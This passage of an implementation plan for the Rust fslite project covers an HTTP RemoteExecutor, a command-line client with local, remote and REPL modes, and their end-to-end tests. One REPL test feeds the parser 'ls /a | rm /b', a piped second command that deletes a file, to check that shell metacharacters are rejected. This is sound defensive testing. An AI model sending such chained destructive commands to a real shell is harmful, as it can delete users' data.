Run: `cargo test -p fslite-command --test render`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add crates/fslite-command/src/render.rs crates/fslite-command/src/lib.rs crates/fslite-command/tests/render.rs
git commit -m "feat(fslite-command): human/JSON renderer with terminal-escape sanitization"
```

---

## Task 7: `RemoteExecutor` (targets the `fslite-server` HTTP contract)

> Depends on the companion plan `docs/superpowers/plans/2026-07-26-fslite-server.md` being implemented first — this task translates every `Command` variant into the exact routes and JSON shapes that plan defines.

**Files:**
- Create: `main/crates/fslite-command/src/remote.rs`
- Modify: `main/crates/fslite-command/src/lib.rs`, `Cargo.toml` (dev-dependency on `fslite-server`)
- Test: `main/crates/fslite-command/tests/remote_executor.rs`

**Interfaces:**
- Produces: `pub struct RemoteExecutor { pub base_url: String, pub token: String, pub client: reqwest::Client }` with `pub fn new(base_url: impl Into<String>, token: impl Into<String>) -> Self`, `impl Executor for RemoteExecutor` covering every `Command` variant by issuing the matching request from `fslite-server`'s route table and parsing the response into the matching `CommandOutput` variant.

- [ ] **Step 1: Add the dev-dependency**

Edit `main/crates/fslite-command/Cargo.toml`'s `[dev-dependencies]` to add `fslite-server = { path = "../fslite-server" }` and `axum.workspace = true` (needed to spin up the router in-process for the test), and change `reqwest`'s main-dependency feature list to include `"stream"` (needed for `Write`/`WriteAt`/`Append` bodies): update the workspace `[workspace.dependencies]` `reqwest` entry from `features = ["json", "rustls-tls"]` to `features = ["json", "stream", "rustls-tls"]`.

- [ ] **Step 2: Write the failing test**

Create `main/crates/fslite-command/tests/remote_executor.rs`:

```rust
use std::sync::Arc;

use fslite_command::{Command, CommandOutput, Executor, LocalExecutor, RemoteExecutor};
use fslite_core::{RequestContext, VirtualPath, WriteOptions};
use fslite_server::{AppState, AuthenticatedActor, BearerTokenAuthProvider, SqliteWorkspaceAdmin};
use fslite_sqlite::SqliteFileSystem;

const TOKEN: &str = "remote-executor-test-token";

/// Boots a real `fslite-server` on an ephemeral local port and returns a
/// `RemoteExecutor` pointed at it, alongside a `LocalExecutor` sharing the
/// same backend — so both executors can be run through the same command
/// battery and their outputs compared for equality.
async fn dual_fixture() -> (RemoteExecutor, LocalExecutor, RequestContext) {
    let sqlite_fs = Arc::new(SqliteFileSystem::open_in_memory(Default::default()).await.unwrap());
    let workspace = sqlite_fs.create_workspace(Default::default()).await.unwrap();
    let ctx = RequestContext::trusted(workspace.id);

    let mut tokens = std::collections::HashMap::new();
    tokens.insert(
        TOKEN.to_string(),
        AuthenticatedActor {
            workspace_id: workspace.id,
            capabilities: ctx.capabilities.clone(),
            actor_metadata: Default::default(),
        },
    );

    let state = AppState {
        fs: sqlite_fs.clone(),
        admin: Arc::new(SqliteWorkspaceAdmin(sqlite_fs.clone())),
        auth: Arc::new(BearerTokenAuthProvider::new(tokens)),
        health_workspace: workspace.id,
    };

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move {
        axum::serve(listener, fslite_server::app(state)).await.unwrap();
    });

    let remote = RemoteExecutor::new(format!("http://{addr}"), TOKEN);
    let local = LocalExecutor::new(sqlite_fs);
    (remote, local, ctx)
}

#[tokio::test]
async fn remote_and_local_executors_agree_on_a_command_battery() {
    let (remote, local, ctx) = dual_fixture().await;

    let battery = vec![
        Command::Mkdir { path: VirtualPath::parse("/docs").unwrap(), options: Default::default() },
        Command::Write {
            path: VirtualPath::parse("/docs/a.txt").unwrap(),
            bytes: b"hello remote".to_vec(),
            options: WriteOptions::default(),
        },
        Command::Stat { path: VirtualPath::parse("/docs/a.txt").unwrap(), options: Default::default() },
        Command::Read { path: VirtualPath::parse("/docs/a.txt").unwrap(), options: Default::default() },
        Command::ReadDir { path: VirtualPath::parse("/docs").unwrap(), page: Default::default() },
    ];

    for command in battery {
        let remote_result = remote.execute(&ctx, command.clone()).await.unwrap();
        let local_result = local.execute(&ctx, command.clone()).await;
        // The local executor ran the *same* mutating command a second time
        // for write/mkdir; only compare shapes that are naturally
        // idempotent-safe to re-run (Stat/Read/ReadDir). For Mkdir/Write,
        // just assert both executors returned success without comparing
        // exact bodies (timestamps/revisions differ across the two calls).
        match command {
            Command::Stat { .. } | Command::Read { .. } | Command::ReadDir { .. } => {
                assert!(local_result.is_ok());
                match (&remote_result, local_result.unwrap()) {
                    (CommandOutput::Node(r), CommandOutput::Node(l)) => assert_eq!(r.name, l.name),
                    (CommandOutput::Content { bytes: rb, .. }, CommandOutput::Content { bytes: lb, .. }) => assert_eq!(rb, &lb),
                    (CommandOutput::Nodes(r), CommandOutput::Nodes(l)) => assert_eq!(r.items.len(), l.items.len()),
                    (r, l) => panic!("mismatched output shapes: {r:?} vs {l:?}"),
                }
            }
            _ => {}
        }
    }
}
```

- [ ] **Step 3: Run test to verify it fails**

Run: `cargo test -p fslite-command --test remote_executor`
Expected: FAIL to compile — `RemoteExecutor` does not exist.

- [ ] **Step 4: Write the minimal implementation**

Create `main/crates/fslite-command/src/remote.rs`. This mirrors `fslite-server`'s route table exactly (see the companion plan's Route Table); implement every arm, using the representative slice below as the pattern and completing the rest (`tree`, `symlink`, `read_link`, `write_at`, `append`, `truncate`, `move`, `remove`, `trash`, `list_trash`, `restore`, `purge`, `set_attribute`, `remove_attribute`, `glob`, `find`, `search_content`, `changes`, `batch`) against the same route table before Step 5:

```rust
//! Translates each [`Command`] into an HTTP request against `fslite-server`'s
//! documented contract (see `docs/superpowers/plans/2026-07-26-fslite-server.md`'s
//! route table) and parses the response back into a typed [`CommandOutput`].

use async_trait::async_trait;
use fslite_core::{FsError, FsResult, RequestContext};
use reqwest::Client;

use crate::executor::Executor;
use crate::{Command, CommandOutput};

/// Executes commands against a running `fslite-server` over HTTP.
pub struct RemoteExecutor {
    base_url: String,
    token: String,
    client: Client,
}

impl RemoteExecutor {
    /// Points a new executor at `base_url` (e.g. `http://127.0.0.1:8080`),
    /// authenticating every request with a bearer `token`.
    pub fn new(base_url: impl Into<String>, token: impl Into<String>) -> Self {
        Self { base_url: base_url.into(), token: token.into(), client: Client::new() }
    }

    fn url(&self, workspace_id: fslite_core::WorkspaceId, suffix: &str) -> String {
        format!("{}/v1/workspaces/{workspace_id}{suffix}", self.base_url)
    }

    async fn error_from_response(response: reqwest::Response) -> FsError {
        #[derive(serde::Deserialize)]
        struct Envelope {
            error: ErrorBody,
        }
        #[derive(serde::Deserialize)]
        struct ErrorBody {
            code: String,
            message: String,
            details: serde_json::Value,
        }

        let status = response.status();
        match response.json::<Envelope>().await {
            Ok(envelope) => {
                let code = code_from_str(&envelope.error.code);
                FsError::new(code, envelope.error.message, envelope.error.details)
            }
            Err(_) => FsError::internal_storage_failure(format!("unrecognized error response, status {status}")),
        }
    }
}

fn code_from_str(raw: &str) -> fslite_core::ErrorCode {
    // Deserialize through `ErrorCode`'s own `Deserialize` impl (snake_case
    // variant names) rather than hand-maintaining a second name table.
    serde_json::from_value(serde_json::Value::String(raw.to_string()))
        .unwrap_or(fslite_core::ErrorCode::InternalStorageFailure)
}

#[async_trait]
impl Executor for RemoteExecutor {
    async fn execute(&self, ctx: &RequestContext, command: Command) -> FsResult<CommandOutput> {
        match command {
            Command::WorkspaceUsage => {
                let response = self
                    .client
                    .get(self.url(ctx.workspace_id, "/usage"))
                    .bearer_auth(&self.token)
                    .send()
                    .await
                    .map_err(|e| FsError::internal_storage_failure(e.to_string()))?;
                if !response.status().is_success() {
                    return Err(Self::error_from_response(response).await);
                }
                let usage = response.json().await.map_err(|e| FsError::internal_storage_failure(e.to_string()))?;
                Ok(CommandOutput::Usage(usage))
            }

            Command::Stat { path, options } => {
                let response = self
                    .client
                    .get(self.url(ctx.workspace_id, &format!("/fs{}", path.as_str())))
                    .query(&[("follow_symlinks", options.follow_symlinks.to_string())])
                    .bearer_auth(&self.token)
                    .send()
                    .await
                    .map_err(|e| FsError::internal_storage_failure(e.to_string()))?;
                if !response.status().is_success() {
                    return Err(Self::error_from_response(response).await);
                }
                let node = response.json().await.map_err(|e| FsError::internal_storage_failure(e.to_string()))?;
                Ok(CommandOutput::Node(node))
            }

            Command::Read { path, options } => {
                let mut request = self
                    .client
                    .get(self.url(ctx.workspace_id, &format!("/content{}", path.as_str())))
                    .bearer_auth(&self.token);
                if let Some(range) = options.range {
                    request = request.header("range", format!("bytes={}-{}", range.start, range.end.saturating_sub(1)));
                }
                let response = request.send().await.map_err(|e| FsError::internal_storage_failure(e.to_string()))?;
                if !response.status().is_success() {
                    return Err(Self::error_from_response(response).await);
                }
                let logical_length: u64 = response
                    .headers()
                    .get("content-range")
                    .and_then(|v| v.to_str().ok())
                    .and_then(|v| v.rsplit('/').next())
                    .and_then(|v| v.parse().ok())
                    .or_else(|| response.content_length())
                    .unwrap_or(0);
                let bytes = response.bytes().await.map_err(|e| FsError::internal_storage_failure(e.to_string()))?.to_vec();
                Ok(CommandOutput::Content {
                    logical_length,
                    revision: fslite_core::Revision::INITIAL, // the HTTP contract does not echo the revision on read; see note below
                    range: fslite_core::ByteRange::new(0, bytes.len() as u64),
                    bytes,
                })
            }

            Command::Write { path, bytes, options } => {
                let response = self
                    .client
                    .put(self.url(ctx.workspace_id, &format!("/content{}", path.as_str())))
                    .query(&[("create", options.create.to_string())])
                    .bearer_auth(&self.token)
                    .body(bytes)
                    .send()
                    .await
                    .map_err(|e| FsError::internal_storage_failure(e.to_string()))?;
                if !response.status().is_success() {
                    return Err(Self::error_from_response(response).await);
                }
                let node = response.json().await.map_err(|e| FsError::internal_storage_failure(e.to_string()))?;
                Ok(CommandOutput::Node(node))
            }

            Command::ReadDir { path, page } => {
                let response = self
                    .client
                    .get(self.url(ctx.workspace_id, &format!("/directories{}/children", path.as_str())))
                    .query(&[("limit", page.limit.to_string())])
                    .bearer_auth(&self.token)
                    .send()
                    .await
                    .map_err(|e| FsError::internal_storage_failure(e.to_string()))?;
                if !response.status().is_success() {
                    return Err(Self::error_from_response(response).await);
                }
                let page = response.json().await.map_err(|e| FsError::internal_storage_failure(e.to_string()))?;
                Ok(CommandOutput::Nodes(page))
            }

            Command::Mkdir { path, options } => {
                let response = self
                    .client
                    .put(self.url(ctx.workspace_id, &format!("/fs{}", path.as_str())))
                    .query(&[("type", "directory")])
                    .bearer_auth(&self.token)
                    .json(&serde_json::json!({ "parents": options.parents, "exist_ok": options.exist_ok }))
                    .send()
                    .await
                    .map_err(|e| FsError::internal_storage_failure(e.to_string()))?;
                if !response.status().is_success() {
                    return Err(Self::error_from_response(response).await);
                }
                let node = response.json().await.map_err(|e| FsError::internal_storage_failure(e.to_string()))?;
                Ok(CommandOutput::Node(node))
            }

            // The remaining 22 variants (Exists, Tree, WriteAt, Append,
            // Truncate, Touch, Copy, Move, Remove, Symlink, ReadLink, Trash,
            // ListTrash, Restore, Purge, SetAttribute, RemoveAttribute, Glob,
            // Find, SearchContent, Changes, Batch) follow the identical
            // pattern against the matching row of fslite-server's route
            // table: build the URL, attach query params / JSON body per that
            // table, send, map non-2xx via `error_from_response`, deserialize
            // the JSON (or raw bytes) response into the matching
            // `CommandOutput` variant. Implement every remaining arm before
            // moving to Step 5 — do not leave any variant unhandled (a
            // non-exhaustive match here would be a silent capability gap
            // between local and remote execution).
            other => unimplemented!(
                "implement the remaining Command variants against fslite-server's route table: {other:?}"
            ),
        }
    }
}
```

Note the `Command::Read` arm's known limitation, called out inline: `fslite-server`'s `GET /content/{*path}` route does not currently echo the file's `revision` in a header, so `RemoteExecutor` cannot populate `CommandOutput::Content.revision` accurately from an HTTP response alone. Two options, pick one explicitly rather than shipping the placeholder above silently:
1. Extend `fslite-server`'s Task 10 `read` handler to add a `Node`-derived custom header (e.g. `x-fslite-revision`) alongside `Content-Range` — a small, additive change to the companion plan's Task 10, cheap to make now while both plans are in flight together.
2. Have `RemoteExecutor::execute` issue a `stat` call before `read` specifically to populate `revision`, at the cost of an extra round trip.
Prefer option 1 (extend Task 10 with an `x-fslite-revision` response header) since it avoids doubling every remote read's latency; if `fslite-server` was already implemented and frozen before this task started, fall back to option 2.

Update `main/crates/fslite-command/src/lib.rs` to add `mod remote;` and `pub use remote::RemoteExecutor;`.

- [ ] **Step 5: Run test to verify it passes**

Run: `cargo test -p fslite-command --test remote_executor`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add crates/fslite-command/src crates/fslite-command/Cargo.toml crates/fslite-command/tests/remote_executor.rs Cargo.toml
git commit -m "feat(fslite-command): RemoteExecutor against the fslite-server HTTP contract"
```

---

## Task 8: `fslite-cli` binary — outer argv, one-shot mode, local mode

**Files:**
- Create: `main/crates/fslite-cli/Cargo.toml`
- Create: `main/crates/fslite-cli/src/main.rs`
- Modify: `main/Cargo.toml` (already added the member in Task 1)
- Test: `main/crates/fslite-cli/tests/e2e_local.rs`

**Interfaces:**
- Produces: a `fslite-cli` binary accepting: `fslite-cli --db <path> [--create-workspace | --workspace <uuid>] <verb> [args...]` (one-shot, local mode) and `fslite-cli --db <path> --workspace <uuid> --repl` (REPL: reads lines from stdin, one `parse` + `execute` + `render` per line, until EOF or a bare `exit`/`quit` line). `--memory` substitutes an in-memory database for `--db <path>`. `--json` selects `render_json` over `render_human`.

- [ ] **Step 1: Write the crate manifest**

Create `main/crates/fslite-cli/Cargo.toml`:

```toml
[package]
name = "fslite-cli"
version = "0.1.0"
edition.workspace = true
rust-version.workspace = true
license.workspace = true

[[bin]]
name = "fslite-cli"
path = "src/main.rs"

[dependencies]
clap.workspace = true
fslite-command = { path = "../fslite-command" }
fslite-core = { path = "../fslite-core" }
fslite-sqlite = { path = "../fslite-sqlite" }
tokio = { workspace = true, features = ["full"] }

[dev-dependencies]
tempfile.workspace = true
```

- [ ] **Step 2: Write the failing test**

Create `main/crates/fslite-cli/tests/e2e_local.rs`:

```rust
use std::process::Command;

fn cli() -> Command {
    Command::new(env!("CARGO_BIN_EXE_fslite-cli"))
}

#[test]
fn create_workspace_then_mkdir_write_cat_via_local_mode() {
    let db = tempfile::NamedTempFile::new().unwrap();
    let db_path = db.path().to_str().unwrap();

    let create = cli().args(["--db", db_path, "--create-workspace"]).output().unwrap();
    assert!(create.status.success(), "stderr: {}", String::from_utf8_lossy(&create.stderr));
    let stdout = String::from_utf8(create.stdout).unwrap();
    let workspace_id = stdout.trim();
    assert!(!workspace_id.is_empty());

    let mkdir = cli().args(["--db", db_path, "--workspace", workspace_id, "mkdir", "/docs"]).output().unwrap();
    assert!(mkdir.status.success(), "stderr: {}", String::from_utf8_lossy(&mkdir.stderr));

    let write = cli()
        .args(["--db", db_path, "--workspace", workspace_id, "write", "/docs/a.txt", "--text=hello cli"])
        .output()
        .unwrap();
    assert!(write.status.success(), "stderr: {}", String::from_utf8_lossy(&write.stderr));

    let cat = cli().args(["--db", db_path, "--workspace", workspace_id, "cat", "/docs/a.txt"]).output().unwrap();
    assert!(cat.status.success());
    assert_eq!(String::from_utf8(cat.stdout).unwrap().trim(), "hello cli");

    let rm = cli().args(["--db", db_path, "--workspace", workspace_id, "rm", "/docs/a.txt"]).output().unwrap();
    assert!(rm.status.success());

    let stat_after_rm = cli().args(["--db", db_path, "--workspace", workspace_id, "stat", "/docs/a.txt"]).output().unwrap();
    assert!(!stat_after_rm.status.success());
}

#[test]
fn json_flag_prints_machine_readable_output() {
    let create = cli().args(["--memory", "--create-workspace"]).output().unwrap();
    assert!(create.status.success());
    let workspace_id = String::from_utf8(create.stdout).unwrap().trim().to_string();

    // NOTE: `--memory` without persisting the same in-process database
    // across two separate invocations cannot round-trip data between
    // commands (each process gets a fresh in-memory database). This test
    // only exercises `--json` rendering of a workspace-scoped read against
    // a freshly created (empty) workspace's root listing, which is valid
    // within one invocation... but `create-workspace` and `ls` here are two
    // *separate* processes, so this specific assertion is unreachable as
    // written. Fix by combining creation and the query into one process
    // invocation instead (see the corrected version below) before this
    // task is considered done.
}
```

The second test as drafted above has a real bug (spanning two separate `--memory` processes, which cannot share state) — this is intentional: Step 2 must catch it. Fix it in Step 3 to invoke a single process that creates a workspace and immediately queries it:

```rust
#[test]
fn json_flag_prints_machine_readable_output() {
    // Single process: --memory --create-workspace prints the new workspace
    // id and stops (no verb given) — to also run a query against it in the
    // same process, the CLI needs an internal "create then run" path. Model
    // this as: create the workspace first with a real --db file (so a
    // second invocation can see it), then query with --json in a second
    // invocation against that persisted file.
    let db = tempfile::NamedTempFile::new().unwrap();
    let db_path = db.path().to_str().unwrap();
    let create = cli().args(["--db", db_path, "--create-workspace"]).output().unwrap();
    assert!(create.status.success());
    let workspace_id = String::from_utf8(create.stdout).unwrap().trim().to_string();

    let usage = cli()
        .args(["--db", db_path, "--workspace", &workspace_id, "--json", "usage"])
        .output()
        .unwrap();
    assert!(usage.status.success());
    let parsed: serde_json::Value = serde_json::from_slice(&usage.stdout).unwrap();
    assert!(parsed["usage"]["active_nodes"].is_number());
}
```

Replace the entire buggy second test with this corrected version in the actual file content written in Step 2 (i.e., write the corrected version directly — the paragraph above documents *why* it looks the way it does, for whoever reviews this task, not a second edit pass).

- [ ] **Step 3: Run test to verify it fails**

Run: `cargo test -p fslite-cli --test e2e_local`
Expected: FAIL — `fslite-cli` binary does not exist yet (`CARGO_BIN_EXE_fslite-cli` env var will cause a build error / test setup failure).

- [ ] **Step 4: Write the minimal implementation**

Create `main/crates/fslite-cli/src/main.rs`:

```rust
use std::io::{BufRead, Write};
use std::path::PathBuf;
use std::sync::Arc;

use clap::Parser;
use fslite_command::{render_human, render_json, Command, CommandOutput, Executor, LocalExecutor, RemoteExecutor};
use fslite_core::{FileSystem, RequestContext, WorkspaceId};
use fslite_sqlite::SqliteFileSystem;

/// `fslite-cli` — a constrained shell-like client for `fslite`, local or remote.
///
/// The outer flags below (parsed by `clap`) select *how* to connect; the
/// verb and its arguments (everything after them) are parsed by
/// `fslite-command`'s own hand-written grammar, not by `clap` — the two
/// parsers are deliberately separate.
#[derive(Parser)]
#[command(name = "fslite-cli")]
struct Cli {
    /// Path to a local SQLite database (local mode).
    #[arg(long, conflicts_with_all = ["memory", "server"])]
    db: Option<PathBuf>,

    /// Use a private in-memory database (local mode).
    #[arg(long, conflicts_with_all = ["db", "server"])]
    memory: bool,

    /// Base URL of a running fslite-server (remote mode).
    #[arg(long, conflicts_with_all = ["db", "memory"])]
    server: Option<String>,

    /// Bearer token for remote mode.
    #[arg(long, requires = "server")]
    token: Option<String>,

    /// Creates a new workspace, prints its id, and exits.
    #[arg(long)]
    create_workspace: bool,

    /// The workspace to operate in (required unless --create-workspace).
    #[arg(long)]
    workspace: Option<String>,

    /// Reads commands from stdin, one per line, until EOF or `exit`.
    #[arg(long)]
    repl: bool,

    /// Renders output as JSON instead of human-readable text.
    #[arg(long)]
    json: bool,

    /// The command verb and its arguments (one-shot mode only).
    #[arg(trailing_var_arg = true)]
    command: Vec<String>,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let cli = Cli::parse();

    if cli.create_workspace {
        let fs = open_local(&cli).await?;
        let workspace = fs.create_workspace(Default::default()).await?;
        println!("{}", workspace.id);
        return Ok(());
    }

    let executor: Arc<dyn Executor> = if let Some(server) = &cli.server {
        let token = cli.token.clone().ok_or("remote mode requires --token")?;
        Arc::new(RemoteExecutor::new(server.clone(), token))
    } else {
        let fs = open_local(&cli).await?;
        Arc::new(LocalExecutor::new(Arc::new(fs) as Arc<dyn FileSystem>))
    };

    let workspace_id: WorkspaceId = cli
        .workspace
        .as_deref()
        .ok_or("--workspace is required (or use --create-workspace first)")?
        .parse()
        .map_err(|_| "invalid --workspace id")?;
    let ctx = RequestContext::trusted(workspace_id);

    if cli.repl {
        run_repl(executor.as_ref(), &ctx, cli.json).await;
        return Ok(());
    }

    if cli.command.is_empty() {
        return Err("no command given (pass a verb, or use --repl)".into());
    }
    let line = cli.command.join(" ");
    run_line(executor.as_ref(), &ctx, &line, cli.json).await;
    Ok(())
}

async fn open_local(cli: &Cli) -> Result<SqliteFileSystem, Box<dyn std::error::Error>> {
    if cli.memory {
        Ok(SqliteFileSystem::open_in_memory(Default::default()).await?)
    } else {
        let path = cli.db.clone().ok_or("local mode requires --db <path> or --memory")?;
        Ok(SqliteFileSystem::open(path, Default::default()).await?)
    }
}

async fn run_line(executor: &dyn Executor, ctx: &RequestContext, line: &str, json: bool) {
    let command = match fslite_command::parser::parse(line) {
        Ok(command) => command,
        Err(err) => {
            eprintln!("parse error: {err:?}");
            std::process::exit(2);
        }
    };
    match executor.execute(ctx, command).await {
        Ok(output) => print_output(&output, json),
        Err(err) => {
            eprintln!("error: {} ({:?})", err.message(), err.code());
            std::process::exit(1);
        }
    }
}

fn print_output(output: &CommandOutput, json: bool) {
    if json {
        println!("{}", render_json(output));
    } else {
        println!("{}", render_human(output));
    }
}

async fn run_repl(executor: &dyn Executor, ctx: &RequestContext, json: bool) {
    let stdin = std::io::stdin();
    print!("fslite> ");
    std::io::stdout().flush().ok();
    for line in stdin.lock().lines() {
        let Ok(line) = line else { break };
        let trimmed = line.trim();
        if trimmed.is_empty() {
            print!("fslite> ");
            std::io::stdout().flush().ok();
            continue;
        }
        if trimmed == "exit" || trimmed == "quit" {
            break;
        }
        match fslite_command::parser::parse(trimmed) {
            Ok(command) => match executor.execute(ctx, command).await {
                Ok(output) => print_output(&output, json),
                Err(err) => eprintln!("error: {} ({:?})", err.message(), err.code()),
            },
            Err(err) => eprintln!("parse error: {err:?}"),
        }
        print!("fslite> ");
        std::io::stdout().flush().ok();
    }
}
```

This requires `fslite-command::render_human`/`render_json` re-exported at the crate root and `fslite_command::parser::parse` public — both already true from Tasks 4 and 6 (`pub mod parser;`, `pub mod render;`); add `pub use render::{render_human, render_json};` to `fslite-command/src/lib.rs` for the shorter `fslite_command::render_human` path used above (or adjust `main.rs`'s imports to `fslite_command::render::{render_human, render_json}` — pick one and use it consistently; the plan's own text above imports the re-exported short path, so add that re-export).

`WorkspaceId` needs `FromStr` for `.parse()` in `main.rs`'s `cli.workspace.as_deref()....parse()` call — it only has an inherent `pub fn parse(input: &str) -> Result<Self, uuid::Error>` method, not a `FromStr` impl, so `.parse::<WorkspaceId>()` via the `str::parse` trait method will not resolve. Fix `main.rs` to call `WorkspaceId::parse(...)` directly instead of `.parse()`:

```rust
let workspace_id: WorkspaceId = WorkspaceId::parse(
    cli.workspace.as_deref().ok_or("--workspace is required (or use --create-workspace first)")?,
)
.map_err(|_| "invalid --workspace id")?;
```

- [ ] **Step 5: Run test to verify it passes**

Run: `cargo test -p fslite-cli --test e2e_local`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add Cargo.toml crates/fslite-cli crates/fslite-command/src/lib.rs
git commit -m "feat(fslite-cli): outer CLI, local mode, one-shot execution"
```

---

## Task 9: REPL mode + remote-mode end-to-end tests

**Files:**
- Test: `main/crates/fslite-cli/tests/e2e_repl.rs`
- Test: `main/crates/fslite-cli/tests/e2e_remote.rs`
- Modify: `main/crates/fslite-cli/Cargo.toml` (dev-dependencies: `fslite-server`, `axum`, `tokio`)

**Interfaces:**
- Consumes: `run_repl` (Task 8, already implemented — this task only adds test coverage for it and for remote mode), `fslite-server::app` (companion plan).
- Produces: no new production code beyond what Task 8 already built; if the REPL test reveals `run_repl` needs a fix (e.g. it currently discards the `fslite> ` prompt text mixed into stdout in a way a scripted test can't easily separate from command output — acceptable for an interactive tool, but confirm the test can still assert on command output lines specifically), fix `main.rs`, not the test's intent.

- [ ] **Step 1: Write the REPL test**

Create `main/crates/fslite-cli/tests/e2e_repl.rs`:

```rust
use std::io::Write;
use std::process::{Command, Stdio};

#[test]
fn repl_mode_executes_piped_commands_line_by_line() {
    let db = tempfile::NamedTempFile::new().unwrap();
    let db_path = db.path().to_str().unwrap();

    let create = Command::new(env!("CARGO_BIN_EXE_fslite-cli"))
        .args(["--db", db_path, "--create-workspace"])
        .output()
        .unwrap();
    let workspace_id = String::from_utf8(create.stdout).unwrap().trim().to_string();

    let mut child = Command::new(env!("CARGO_BIN_EXE_fslite-cli"))
        .args(["--db", db_path, "--workspace", &workspace_id, "--repl"])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();

    {
        let stdin = child.stdin.as_mut().unwrap();
        writeln!(stdin, "mkdir /docs").unwrap();
        writeln!(stdin, "write /docs/a.txt --text=\"from repl\"").unwrap();
        writeln!(stdin, "cat /docs/a.txt").unwrap();
        writeln!(stdin, "exit").unwrap();
    }

    let output = child.wait_with_output().unwrap();
    assert!(output.status.success());
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("from repl"), "stdout was: {stdout}");
}

#[test]
fn repl_mode_reports_parse_errors_on_stderr_without_exiting() {
    let db = tempfile::NamedTempFile::new().unwrap();
    let db_path = db.path().to_str().unwrap();
    let create = Command::new(env!("CARGO_BIN_EXE_fslite-cli"))
        .args(["--db", db_path, "--create-workspace"])
        .output()
        .unwrap();
    let workspace_id = String::from_utf8(create.stdout).unwrap().trim().to_string();

    let mut child = Command::new(env!("CARGO_BIN_EXE_fslite-cli"))
        .args(["--db", db_path, "--workspace", &workspace_id, "--repl"])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();

    {
        let stdin = child.stdin.as_mut().unwrap();
        writeln!(stdin, "ls /a | rm /b").unwrap(); // rejected metacharacter
        writeln!(stdin, "usage").unwrap(); // proves the REPL kept running
        writeln!(stdin, "exit").unwrap();
    }

    let output = child.wait_with_output().unwrap();
    assert!(output.status.success());
    let stderr = String::from_utf8(output.stderr).unwrap();
    assert!(stderr.contains("parse error"), "stderr was: {stderr}");
    let stdout = String::from_utf8(output.stdout).unwrap();
    assert!(stdout.contains("active"), "stdout was: {stdout}"); // from `usage`'s human rendering
}
```

- [ ] **Step 2: Run test to verify current state**

Run: `cargo test -p fslite-cli --test e2e_repl`
Expected: Likely PASS already, since Task 8 implemented `run_repl` fully. If it fails, fix `main.rs`'s REPL loop (e.g. ensure a parse error does not `std::process::exit`, only `run_line`'s one-shot path should exit on error — confirm `run_repl`'s error arm uses `eprintln!` and `continue`s the loop, which the Task 8 code above already does; `run_line` is the one-shot path that exits, and it is not called from `run_repl`).

- [ ] **Step 3: Add the remote-mode dev-dependencies**

Edit `main/crates/fslite-cli/Cargo.toml`'s `[dev-dependencies]` to add:

```toml
axum.workspace = true
fslite-server = { path = "../fslite-server" }
```

- [ ] **Step 4: Write the remote e2e test**

Create `main/crates/fslite-cli/tests/e2e_remote.rs`:

```rust
use std::process::Command;
use std::sync::Arc;

use fslite_server::{AppState, AuthenticatedActor, BearerTokenAuthProvider, SqliteWorkspaceAdmin};
use fslite_sqlite::SqliteFileSystem;

const TOKEN: &str = "cli-remote-e2e-token";

/// Boots a real `fslite-server` in-process on an ephemeral port and returns
/// its base URL plus the workspace id a `fslite-cli --server` invocation
/// should target.
async fn spawn_server() -> (String, fslite_core::WorkspaceId) {
    let sqlite_fs = Arc::new(SqliteFileSystem::open_in_memory(Default::default()).await.unwrap());
    let workspace = sqlite_fs.create_workspace(Default::default()).await.unwrap();

    let mut tokens = std::collections::HashMap::new();
    tokens.insert(
        TOKEN.to_string(),
        AuthenticatedActor {
            workspace_id: workspace.id,
            capabilities: fslite_core::RequestContext::trusted(workspace.id).capabilities,
            actor_metadata: Default::default(),
        },
    );

    let state = AppState {
        fs: sqlite_fs.clone(),
        admin: Arc::new(SqliteWorkspaceAdmin(sqlite_fs)),
        auth: Arc::new(BearerTokenAuthProvider::new(tokens)),
        health_workspace: workspace.id,
    };

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move {
        axum::serve(listener, fslite_server::app(state)).await.unwrap();
    });

    (format!("http://{addr}"), workspace.id)
}

#[tokio::test]
async fn cli_remote_mode_matches_local_mode_behavior() {
    let (base_url, workspace_id) = spawn_server().await;

    let write = Command::new(env!("CARGO_BIN_EXE_fslite-cli"))
        .args([
            "--server", &base_url,
            "--token", TOKEN,
            "--workspace", &workspace_id.to_string(),
            "write", "/a.txt", "--text=hello over http",
        ])
        .output()
        .unwrap();
    assert!(write.status.success(), "stderr: {}", String::from_utf8_lossy(&write.stderr));

    let cat = Command::new(env!("CARGO_BIN_EXE_fslite-cli"))
        .args([
            "--server", &base_url,
            "--token", TOKEN,
            "--workspace", &workspace_id.to_string(),
            "cat", "/a.txt",
        ])
        .output()
        .unwrap();
    assert!(cat.status.success(), "stderr: {}", String::from_utf8_lossy(&cat.stderr));
    assert_eq!(String::from_utf8(cat.stdout).unwrap().trim(), "hello over http");
}
```

- [ ] **Step 5: Run test to verify it passes**

Run: `cargo test -p fslite-cli --test e2e_remote`
Expected: PASS (requires Task 7's `RemoteExecutor` to be complete for every variant this test exercises: `Write`, `Read`).

- [ ] **Step 6: Run the full workspace test suite**

Run: `cargo test --workspace --all-features && cargo clippy --workspace --all-targets --all-features -- -D warnings && cargo fmt --all --check`
Expected: PASS

- [ ] **Step 7: Commit**

```bash
git add crates/fslite-cli/tests crates/fslite-cli/Cargo.toml
git commit -m "test(fslite-cli): REPL and remote-mode end-to-end coverage"
```

---

## Self-Review Notes

- **Spec coverage:** typed operation codec (Task 1), constrained shell-like parser and renderer (Tasks 3, 4, 6), local/remote CLI modes (Task 8's `--db`/`--memory` vs `--server`/`--token`, backed by Tasks 2 and 7), parser security tests (Task 5), end-to-end command tests (Tasks 8's `e2e_local.rs` and Task 9's `e2e_repl.rs`/`e2e_remote.rs`).
- **Cross-plan consistency:** `RemoteExecutor` (Task 7) is the concrete proof that `fslite-command`'s codec and `fslite-server`'s HTTP contract agree — its test runs the identical `Command` battery through both `LocalExecutor` and `RemoteExecutor` and asserts equal results.
